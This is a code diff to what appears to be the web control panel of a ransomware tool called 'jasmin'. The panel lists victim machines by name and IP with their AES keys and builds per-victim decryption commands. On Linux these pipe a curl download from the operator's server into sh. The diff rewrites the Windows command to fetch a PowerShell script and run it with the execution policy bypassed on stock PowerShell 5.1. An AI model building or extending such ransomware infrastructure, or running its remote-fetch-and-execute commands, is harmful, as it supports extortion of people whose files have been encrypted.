@@ -247,9 +247,9 @@ curl -sL <?=$server_url?>/payloads/jasmin_unlock.sh | sh -s <?=$server_url?> "<?
 # 不写目录 = 解密全部加密文件；只解特定目录时在末尾追加，如: /data /home</pre>
 <?php else:?>
 <pre class="dt-code">:: <?=h($row['machine_name'])?> (<?=h($row['ip'])?>) 一键解密 — 纯 PowerShell，无需编译 exe
-:: 要求 PowerShell 7+  (未装可执行: winget install Microsoft.PowerShell)
+:: 要求 PowerShell 5.1+（Windows 10/11、Server 2016+ 系统自带，无需安装任何东西）
 curl.exe -sL <?=$server_url?>/payloads/jasmin_unlock.ps1 -o jasmin_unlock.ps1
-pwsh -File jasmin_unlock.ps1 -Server <?=$server_url?> -K "<?=$aes_pwd?>"
+powershell -ExecutionPolicy Bypass -File jasmin_unlock.ps1 -Server <?=$server_url?> -K "<?=$aes_pwd?>"
 :: -Paths 换成要解密的目录；不写则解密当前目录</pre>
 <?php endif;?>
 </td></tr>
@@ -479,7 +479,7 @@ function showDecrypt(vid,el){
   var pre=document.createElement('pre');pre.className='dt-code';
   pre.textContent = isLinux
     ? '# '+ip+' 一键解密 — 纯 openssl 零依赖\ncurl -sL '+srv+'/payloads/jasmin_unlock.sh | sh -s '+srv+' "'+k+'"\n# 不写目录 = 解密全部加密文件；只解特定目录时在末尾追加，如: /data /home'
-    : ':: '+ip+' 一键解密 — 纯 PowerShell，无需编译 exe\n:: 要求 PowerShell 7+  (未装可执行: winget install Microsoft.PowerShell)\ncurl.exe -sL '+srv+'/payloads/jasmin_unlock.ps1 -o jasmin_unlock.ps1\npwsh -File jasmin_unlock.ps1 -Server '+srv+' -K "'+k+'"\n:: 不写 -Paths = 解密全部加密文件';
+    : ':: '+ip+' 一键解密 — 纯 PowerShell，无需编译 exe\n:: 要求 PowerShell 5.1+（Windows 10/11、Server 2016+ 系统自带，无需安装任何东西）\ncurl.exe -sL '+srv+'/payloads/jasmin_unlock.ps1 -o jasmin_unlock.ps1\npowershell -ExecutionPolicy Bypass -File jasmin_unlock.ps1 -Server '+srv+' -K "'+k+'"\n:: 不写 -Paths = 解密全部加密文件';
   td.appendChild(pre);
   nr.appendChild(td);tr.after(nr);_decOpen=nr;
 }
